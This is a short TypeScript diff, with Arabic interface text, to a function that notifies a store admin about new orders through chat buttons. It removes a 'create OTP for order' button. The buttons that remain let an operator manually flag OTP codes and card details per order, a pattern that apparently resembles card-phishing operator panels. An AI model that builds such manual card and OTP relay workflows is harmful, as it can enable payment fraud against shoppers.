@@ -93,7 +93,7 @@ async function notifyAdminAboutNewOrder(db: Db, order: StoreOrder) {
     `الإجمالي: ${Number(order.total || 0).toLocaleString('en-US')} ر.س`,
     `التقسيط: ${order.installment ? 'نعم' : 'لا'}`,
     '',
-    'افتح تفاصيل الطلب لمراجعته وإنشاء رمز التأكيد.'
+    'افتح تفاصيل الطلب لمراجعته.'
   ].join('\n');
 
   try {
@@ -105,7 +105,6 @@ async function notifyAdminAboutNewOrder(db: Db, order: StoreOrder) {
           [{ text: '❌ طلب رمز OTP جديد', callback_data: 'order-notice:' + orderId + ':otp' }],
           [{ text: 'لا يوجد رصيد كافٍ', callback_data: 'order-notice:' + orderId + ':balance' }],
           [{ text: 'بيانات البطاقة خاطئة', callback_data: 'order-notice:' + orderId + ':card' }],
-          [{ text: '🔐 إنشاء OTP للطلب', callback_data: 'create-order-otp:' + orderId }],
           [{ text: '6️⃣ ✅ طلب مكتمل', callback_data: 'status:' + orderId + ':completed' }]
         ]
       }
